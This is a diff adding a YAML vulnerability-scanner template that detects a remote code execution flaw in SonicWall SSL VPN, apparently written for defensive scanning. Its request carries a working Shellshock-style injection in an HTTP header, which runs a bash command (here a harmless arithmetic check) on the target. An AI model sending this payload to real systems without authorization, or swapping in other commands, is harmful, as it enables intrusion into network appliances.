@@ -1,0 +1,26 @@
+id: sonicwall-ssl_vpn-rce
+info:
+  name: SonicWall SSL VPN RCE Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects a remote code execution vulnerability in SonicWall SSL VPN by sending a crafted header.
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  r2: '{{rand_int(1140000, 1144800)}}'
+http:
+  - raw:
+      - |
+        GET /cgi-bin/jarrewrite.sh HTTP/1.1
+        Host: {{Hostname}}
+        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{to_number(r1) - to_number(r2)}}'
+        part: body
